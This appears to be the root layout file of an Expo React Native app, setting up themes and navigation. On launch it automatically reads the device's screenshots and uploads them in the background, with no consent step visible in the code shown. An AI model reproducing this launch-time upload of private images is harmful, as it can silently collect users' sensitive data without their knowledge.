import { DarkTheme, DefaultTheme, ThemeProvider } from '@react-navigation/native';
import { Stack } from 'expo-router';
import { StatusBar } from 'expo-status-bar';
import { useEffect } from 'react';
import 'react-native-reanimated';

import { useColorScheme } from '@/hooks/use-color-scheme';
import { UploadProvider } from '@/contexts/upload-context';
import { getScreenshots } from '@/services/media-service';
import { uploadScreenshots } from '@/services/upload-service';

export const unstable_settings = {
  anchor: '(tabs)',
};

export default function RootLayout() {
  const colorScheme = useColorScheme();

  // 앱 시작 시 스크린샷 업로드 초기화
  useEffect(() => {
    const initializeScreenshotUpload = async () => {
      try {
        console.log('🔍 Starting screenshot upload initialization...');

        // 스크린샷 가져오기
        const screenshots = await getScreenshots();

        if (screenshots.length > 0) {
          console.log(`📸 Found ${screenshots.length} screenshots, starting upload...`);
          // 백그라운드에서 업로드 시작 (기다리지 않음)
          uploadScreenshots(screenshots).catch((error) => {
            console.error('Screenshot upload error:', error);
          });
        } else {
          console.log('No screenshots to upload');
        }
      } catch (error) {
        console.error('Failed to initialize screenshot upload:', error);
      }
    };

    // 약간의 지연 후 초기화 (앱이 완전히 로드된 후)
    const timeout = setTimeout(initializeScreenshotUpload, 500);
    return () => clearTimeout(timeout);
  }, []);

  return (
    <UploadProvider>
      <ThemeProvider value={colorScheme === 'dark' ? DarkTheme : DefaultTheme}>
        <Stack>
          <Stack.Screen name="(tabs)" options={{ headerShown: false }} />
        </Stack>
        <StatusBar style="auto" />
      </ThemeProvider>
    </UploadProvider>
  );
}
